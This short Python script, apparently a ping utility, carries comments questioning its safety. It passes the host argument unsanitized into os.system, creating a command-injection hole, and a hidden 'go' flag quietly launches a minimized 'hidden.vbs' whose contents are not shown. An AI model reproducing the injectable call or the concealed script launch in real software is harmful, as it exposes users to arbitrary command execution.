# sooo it's like ping but +? lmao who named it
# works but sus when go flag is passed

import os
import sys

def run_ping(host):
    print("pingin", host)
    os.system(f"ping -n 2 {host}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "go":
            # yall rly sure this safe?? it ran stuff last time
            os.system("start /min hidden.vbs")  # 👀
        else:
            run_ping(sys.argv[1])
